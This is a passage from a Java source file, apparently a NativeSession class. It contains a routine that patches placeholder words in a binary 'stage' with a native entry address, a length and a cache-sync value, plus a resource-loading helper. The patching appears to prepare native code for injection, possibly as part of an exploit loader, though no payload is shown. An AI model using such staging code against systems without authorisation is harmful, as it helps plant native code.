     * duplicate cannot silently satisfy this mask in the distributed resource.
     */
    private boolean copyAndPatchStage(
            byte[] bytes, int[] words, int wordIndex, int nativeAddress, int nativeLength) {
        int patches = 0;
        for (int i = 0; i < bytes.length; i += 4) {
            int word = readWordLE(bytes, i);
            if (word == NativeProtocol.STAGE_PATCH_ENTRY) {
                word = nativeAddress;
                patches |= 1;
            } else if (word == NativeProtocol.STAGE_PATCH_LENGTH) {
                word = nativeLength;
                patches |= 2;
            } else if (word == NativeProtocol.STAGE_PATCH_CACHE) {
                word = cacheSync;
                patches |= 4;
            }
            words[wordIndex + (i >> 2)] = word;
        }
        return patches == 7;
    }

    private static byte[] readResource(String name) throws IOException {
        InputStream input = NativeSession.class.getResourceAsStream(name);
        if (input == null) {
            return null;
        }
        try {
            ByteArrayOutputStream output = new ByteArrayOutputStream();
            byte[] buffer = new byte[256];
            int count;
            while ((count = input.read(buffer)) >= 0) {
                if (count != 0) {
                    output.write(buffer, 0, count);
                }
            }
            return output.toByteArray();
        } finally {
            input.close();
        }
    }
}
